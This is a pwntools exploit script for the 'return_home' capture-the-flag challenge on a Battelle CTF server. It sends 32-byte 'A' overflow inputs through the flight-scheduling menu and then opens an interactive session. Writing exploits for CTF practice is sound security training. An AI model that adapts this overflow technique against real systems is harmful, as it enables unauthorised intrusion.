#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ctf.battelle.org --port 30040 return_home
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('return_home')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ctf.battelle.org'
port = int(args.PORT or 30040)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *make_complaint
b *schedule_flight+273
b *fly_home+49
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
import time
io = start()

def view():
    io.sendline(b'1')

def schedule_flight(data):
    io.sendline(b'2')
    io.recvuntil('destination.\n')
    io.send(data)

def fly_home():
    io.sendline(b'3')

def make_complaint():
    return

schedule_flight(b'A'*32 + b'|1. MLB|\n')
time.sleep(2)
schedule_flight(b'A'*32 + b'|2. TPA|\n')
time.sleep(2)
schedule_flight(b'A'*32 + b'|3. CLT|\n')
time.sleep(2)
schedule_flight(b'A'*32 + b'|4. IAD|\n')
time.sleep(2)
schedule_flight(b'A'*32 + b'|5. CMH|\n')
time.sleep(2)

fly_home()

io.interactive()

